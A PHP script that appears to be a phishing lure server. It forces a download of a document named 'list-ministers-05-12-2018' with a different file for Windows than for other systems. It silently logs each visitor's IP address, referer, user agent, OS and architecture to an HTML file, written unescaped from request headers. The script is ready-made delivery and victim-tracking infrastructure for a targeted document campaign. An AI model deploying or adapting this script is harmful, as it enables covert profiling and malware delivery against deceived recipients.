<?php
error_reporting(E_ERROR | E_PARSE);

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 10/i'      =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux Core',
                            '/ubuntu/i'             =>  'Linux Ubuntu',
                            '/iphone/i'             =>  'Mobile iPhone',
                            '/ipod/i'               =>  'Mobile iPod',
                            '/ipad/i'               =>  'Mobile iPad',
                            '/android/i'            =>  'Mobile Android',
                            '/blackberry/i'         =>  'Mobile BlackBerry',
                            '/webos/i'              =>  'Mobile Web'
                        );

    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   

    return $os_platform;
}

function getBit($agent){
	if (strpos(strtolower($agent), "wow64") != false || 
		strpos(strtolower($agent), "x86_64") != false || 
		strpos(strtolower($agent), "x86-64") != false || 
		strpos(strtolower($agent), "amd64") != false || 
		strpos(strtolower($agent), "x64_64") != false || 
		strpos(strtolower($agent), "x64") != false || 
		strpos(strtolower($agent), "ia64") != false || 
		strpos(strtolower($agent), "sparc64") != false || 
		strpos(strtolower($agent), "ppc64") != false || 
		strpos(strtolower($agent), "irix64") != false || 
		strpos(strtolower($agent), "win64") != false ){
	   return "64bit";
	} 
	else {
	   return "32bit";
	}
}

$user_os = getOS();
$user_os_bit='';
#echo $user_os;

if (strpos($user_os, 'Windows') !== false){
	#echo "\nCase : Windows";
	$myfile='list-ministers-05-12-2018.docx';
	$user_os_bit=getBit($user_agent);
}
else if (strpos($user_os, 'Linux') !== false){
	#echo "\nCase : Linux";
	$myfile='list-ministers-05-12-2018.doc';
}
else if (strpos($user_os, 'Mac') !== false){
	#echo "\nCase : Mac";
	$myfile='list-ministers-05-12-2018.doc';
}
else if (strpos($user_os, 'Mobile') !== false){
	#echo "\nCase : Mobile";
	$myfile='list-ministers-05-12-2018.doc';
}
else{
	#echo "\nCase Else : ". $user_os;;
	$myfile='list-ministers-05-12-2018.doc';
}

#$myfile='FORM.doc';
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
ob_start();

header('Content-Type: application/msword');
header('Content-Transfer-Encoding: binary');
header('Content-Disposition: attachment; filename="'.$myfile.'"');

$address = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$url = $_SERVER['REQUEST_URI'];
$time = date("H:i dS F Y");

        if ( stripos($agent, 'Firefox') !== false ) {
            $browser = 'firefox';
        } elseif ( stripos($agent, 'MSIE') !== false ) {
            $browser = 'ie';
        } elseif ( stripos($agent, 'Trident') !== false ) {
            $browser = 'ie';
        } elseif ( stripos($agent, 'iPad') !== false ) {
            $browser = 'ipad';
        } elseif ( stripos($agent, 'Android') !== false ) {
            $browser = 'android';
        } elseif ( stripos($agent, 'Chrome') !== false ) {
            $browser = 'chrome';
        } elseif ( stripos($agent, 'Safari') !== false ) {
            $browser = 'safari';
        } elseif ( stripos($agent, 'AIR') !== false ) {
            $browser = 'air';
        } elseif ( stripos($agent, 'Fluid') !== false ) {
            $browser = 'fluid';
        }

$file = fopen("log.html", "a");
fwrite( $file, "[+] <b>#File:</b> $myfile <b>#Time:</b> $time <b>#Random:</b> $url <b>#Referer:</b> $referer <b>#IP Address:</b> $address <b>#Agent:</b> $agent <b>#Browser:</b> $browser <b>#OS : </b> $user_os ^$user_os_bit;<br/><br/>\n" );
fclose($file);
readfile($myfile);
exit();
?>

<? ob_flush(); 
?>      




